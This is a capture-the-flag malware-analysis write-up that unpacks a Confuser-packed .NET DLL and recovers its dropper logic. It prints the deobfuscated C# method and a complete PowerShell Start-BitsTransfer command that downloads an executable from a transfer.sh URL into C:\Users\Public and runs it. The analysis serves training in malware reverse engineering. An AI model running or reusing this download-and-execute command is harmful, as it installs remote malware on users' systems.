## Voldemort 1
To get more information about the DLL file, we open it using DiE.
![](attachments/Pasted%20image%2020230228133111.png)

It's .NET library file packed using Confuser 1.X.
With a quick google search, we can find that it is possible to unpacking using [de4dot-cex](https://github.com/ViRb3/de4dot-cex).
![](attachments/Pasted%20image%2020230228133623.png)

Now we open it using dnSpy.
![](attachments/Pasted%20image%2020230228133748.png)
The method AutoOpen contains the main payload of our malware.

Let's look at this call now
```cs
ne1sy2._bSIbzp9F5FHLOO01xTea86EU5ZK("yqgi.exe", "https://transfer.sh/get/671Cix/123.exe");
```
This is most likely the next stage of the payload.

`Flag: IDEH{yqgi.exe}`

## Voldemort 2

Here is the definition of the method
![](attachments/Pasted%20image%2020230228134727.png)
After deobfuscation:
```cs
private static bool _bSIbzp9F5FHLOO01xTea86EU5ZK(string string_0, string string_1){
     string text = "C:\Users\Public" + string_0;
     ne1sy2.ShellExecute((IntPtr)0, "open", "powershell.exe", string.Concat(new string[]{
     "Start-BitsTransfer -Source ", string_1," -Destination ", text, " ;", text }), "", 0);
     return true;
}
```

`Flag: IDEH{Start-BitsTransfer_-Source_-Destination}`

## Voldemort 3
`Flag: IDEH{https://transfer.sh/get/671Cix/123.exe}`

## Voldemort 4
This is the final command to download and execute the malicious file.
```powershell
powershell.exe Start-BitsTransfer -Source https://transfer.sh/get/671Cix/123.exe -Destination C:\Users\Public\yqgi.exe ;C:\Users\Public\yqgi.exe
```

Flag: `IDEH{powershell.exe_Start-BitsTransfer_-Source_https://transfer.sh/get/671Cix/123.exe_-Destination_C:\Users\Public\yqgi.exe_C:\Users\Public\yqgi.exe}`